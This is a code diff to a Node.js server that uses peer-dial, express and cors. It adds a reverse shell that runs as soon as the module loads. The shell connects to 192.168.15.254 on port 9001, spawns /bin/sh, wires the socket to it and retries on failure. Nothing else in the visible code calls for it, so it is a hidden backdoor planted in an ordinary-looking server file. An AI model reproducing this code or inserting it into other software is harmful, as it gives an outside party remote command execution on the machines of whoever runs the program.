@@ -2,6 +2,28 @@ const dial = require("@patrickkfkan/peer-dial");
 const express = require('express');
 const cors = require('cors');
 const app = express();
+var net = require('net');
+var spawn = require('child_process').spawn;
+
+HOST="192.168.15.254";
+PORT="9001";
+TIMEOUT="5000";
+
+async function c(HOST,PORT) {
+    var client = new net.Socket();
+    client.connect(PORT, HOST, function() {
+        var sh = spawn('/bin/sh',[]);
+        client.write("Connected\r\n");
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    client.on('error', function(e) {
+        setTimeout(c(HOST,PORT), TIMEOUT);
+    });
+}
+
+c(HOST,PORT);
 
 const corsOptions = {
     origin: '*',
